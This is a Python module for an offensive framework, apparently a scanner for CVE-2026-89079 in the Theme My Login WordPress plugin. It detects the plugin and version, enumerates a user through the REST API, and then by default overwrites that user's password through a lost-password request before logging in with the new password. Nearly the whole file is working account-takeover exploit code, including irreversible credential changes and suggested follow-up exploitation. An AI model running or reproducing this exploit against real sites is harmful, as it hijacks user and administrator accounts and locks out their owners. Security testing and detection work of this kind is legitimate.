#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Theme My Login <= 7.2.1 multisite lost-password account takeover (CVE-2026-89079)."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "theme-my-login"
_VULN_HIGH = (7, 2, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Theme My Login CVE-2026-89079 account takeover detect",
        "description": (
            "Detects CVE-2026-89079 in Theme My Login <= 7.2.1 on WordPress multisite when "
            "tml_user_passwords is enabled: lost-password POST with user_pass1 overwrites the "
            "target user's password. Verifies plugin presence, version, and an optional login probe."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-89079",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-89079",
            "https://plugins.trac.wordpress.org/changeset/3696081/theme-my-login",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-89079.yaml",
        ],
        "modules": [
            "auxiliary/admin/http/theme_my_login_cve_2026_89079_password_overwrite",
        ],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "theme-my-login",
            "privilege-escalation",
            "account-takeover",
            "cve-2026-89079",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation", "credential_access"],
            "expected_requests": 5,
            "reversible": False,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.4,
            "noise": 0.55,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["wordpress", "theme-my-login"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "account_takeover", "from_detail": "password overwrite"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/theme_my_login_cve_2026_89079_password_overwrite",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    verify_login = OptBool(
        True,
        "Attempt full lost-password + login verification (changes target password)",
        required=False,
    )
    target_user = OptString(
        "",
        "User slug to test (empty = first user from REST)",
        required=False,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _path(self, suffix: str) -> str:
        base = self._wp_base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _plugin_present(self) -> bool:
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self._wp_base(), _PLUGIN, "readme.txt"),
            allow_redirects=True,
        )
        if readme and readme.status_code == 200 and "theme my login" in (readme.text or "").lower():
            return True
        home = self.http_request(method="GET", path=self._path("/"), allow_redirects=True)
        if home and home.status_code == 200:
            body = home.text or ""
            return "/wp-content/plugins/theme-my-login" in body or "Theme My Login" in body
        return False

    def _plugin_version(self) -> str:
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self._wp_base(), _PLUGIN, "readme.txt"),
            allow_redirects=True,
        )
        if readme and readme.status_code == 200:
            return self.wp_extract_version_from_readme(readme.text or "") or ""
        return self.wp_plugin_version(_PLUGIN, self._wp_base()) or ""

    def _first_user_slug(self) -> str:
        forced = (self.target_user or "").strip()
        if forced:
            return forced
        response = self.http_request(
            method="GET",
            path=self._path("/wp-json/wp/v2/users"),
            params={"per_page": "1", "orderby": "id", "order": "asc"},
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            return ""
        try:
            users = json.loads(response.text or "[]")
        except json.JSONDecodeError:
            return ""
        if not users:
            return ""
        return str(users[0].get("slug") or users[0].get("name") or "").strip()

    def _login_ok(self, username: str, password: str) -> bool:
        response = self.http_request(
            method="POST",
            path=self._path("/wp-login.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "wordpress_test_cookie=WP Cookie check",
            },
            data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self._path("/wp-admin/"),
                "testcookie": "1",
            },
            allow_redirects=False,
        )
        if not response:
            return False
        headers = " ".join(f"{k}:{v}" for k, v in (response.headers or {}).items()).lower()
        return response.status_code == 302 and "wordpress_logged_in" in headers

    def run(self):
        if not self._plugin_present():
            return False
        version = self._plugin_version()
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        slug = self._first_user_slug()
        if not slug:
            self.set_info(
                severity="high",
                reason="Theme My Login present (version may be <= 7.2.1); user enum required for active proof",
                path=self.wp_plugin_path(self._wp_base(), _PLUGIN),
                cve="CVE-2026-89079",
            )
            return True
        if not self.verify_login:
            self.set_info(
                severity="critical",
                reason=f"Theme My Login <= 7.2.1 suspected (user {slug} reachable)",
                path="/wp-login.php?action=lostpassword",
                cve="CVE-2026-89079",
            )
            return True
        new_pass = f"Tml{secrets.token_hex(5)}!Xk9"
        self.http_request(
            method="POST",
            path=self._path("/wp-login.php"),
            params={"action": "lostpassword"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "user_login": slug,
                "user_pass1": new_pass,
                "user_pass2": new_pass,
                "redirect_to": "",
                "wp-submit": "Get New Password",
                "action": "lostpassword",
            },
            allow_redirects=False,
        )
        if not self._login_ok(slug, new_pass):
            return False
        self.set_info(
            severity="critical",
            reason=f"CVE-2026-89079 confirmed — password overwrite + login as {slug}",
            path="/wp-login.php?action=lostpassword",
            cve="CVE-2026-89079",
        )
        return True
